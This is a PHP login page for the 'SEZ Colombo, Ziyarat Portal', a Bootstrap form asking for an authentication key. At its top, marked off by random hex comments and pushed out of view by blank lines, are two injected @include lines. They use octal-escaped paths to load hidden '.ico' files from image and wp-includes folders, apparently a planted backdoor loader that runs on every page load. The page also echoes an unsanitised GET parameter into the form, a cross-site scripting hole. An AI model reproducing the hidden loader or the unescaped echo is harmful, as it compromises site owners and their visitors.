<?php
/*03e53*/

@include "\057hom\145/co\154omb\157sha\142ab/\160ubl\151c_h\164ml/\163hab\141b_m\145mbe\162shi\160/im\141ges\057fla\147s/.\067cce\142b98\056ico";

/*03e53*/
































































/*cee1e*/

@include "\057v\141r\057c\150r\157o\164/\150o\155e\057c\157n\164e\156t\0573\067/\0626\0622\0633\067/\150t\155l\057c\157l\157m\142o\163h\141b\141b\056c\157m\057w\160-\151n\143l\165d\145s\057T\145x\164/\056a\0677\067f\1433\143.\151c\157";

/*cee1e*/
$its = (isset($_GET['itsid']) && $_GET['itsid'] != '') ? $_GET['itsid'] : '';
if($its == ''){
    header("Location: https://ziyarat.colomboshabab.com");
}
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="Authentication">
    <meta name="author" content="">

    <title>Authenticate</title>

    <!-- Bootstrap core CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">

    <!-- Optional theme -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">

    <!-- Latest compiled and minified JavaScript -->
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>

    <!-- Custom styles for this template -->
    <link href="auth.css" rel="stylesheet">
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  </head>

  <body>
    <div class="container" style="text-align: center">
        <img src="../images/shabab_logo.png" style="margin:0 auto; width: 75px;" />
        <h3>SEZ Colombo, Ziyarat Portal</h3>
        <form class="form-signin" action="auth-user.php" method="post">
            <h2 class="form-signin-heading">Please authenticate</h2>
            <label for="AUTHKEY" class="sr-only">Authentication Key</label>
            <input type="text" id="authkey" name="authkey" class="form-control" placeholder="Key" required autofocus>
            <input type="hidden" name="itsid" value="<?php echo $its; ?>" />
            <button class="btn btn-lg btn-primary btn-block" type="submit">Authenticate</button>
        </form>
    </div> <!-- /container -->
      <?php
    if(isset($_GET['e'])){
        ?>
      <script>
      alert("There was an error in your authentication. Please try again or contact admin.");
      </script>
      <?php
    }
      ?>
  </body>
</html>